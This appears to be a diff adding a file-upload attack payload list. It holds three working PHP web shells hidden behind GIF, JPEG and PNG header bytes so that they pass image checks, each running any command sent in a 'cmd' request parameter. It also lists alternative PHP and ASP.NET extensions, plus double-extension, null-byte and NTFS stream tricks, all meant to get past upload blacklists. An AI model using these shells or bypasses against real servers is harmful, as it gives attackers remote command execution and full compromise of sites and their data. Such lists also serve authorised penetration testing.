@@ -1,0 +1,39 @@
+# GIF89a Polyglot WebShell (Bypasses getimagesize and image verification)
+GIF89a<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; die; } ?>
+
+# JPEG Header Polyglot WebShell
+\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00<?php system($_GET['cmd']); ?>
+
+# PNG Header Polyglot WebShell
+\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15c4\x00\x00\x00\x0bIDATx\x9cc\xfa\x0f\x00\x01\x05\x01\x02\x00<?php system($_GET['cmd']); ?>\x00\x00\x00\x00IEND\xaeB`\x82
+
+# Alternative Executable PHP File Extensions (Bypasses blacklists)
+shell.php
+shell.php3
+shell.php4
+shell.php5
+shell.php7
+shell.phtml
+shell.pht
+shell.phar
+shell.pgif
+shell.inc
+
+# IIS / ASP.NET Alternative Extensions
+shell.asp
+shell.aspx
+shell.cer
+shell.asa
+shell.cdx
+shell.ashx
+shell.asmx
+shell.soap
+shell.config
+
+# Double Extension & Null Byte Variants
+shell.php.jpg
+shell.php.png
+shell.php%00.png
+shell.php;.jpg
+shell.php.
+shell.php::$DATA
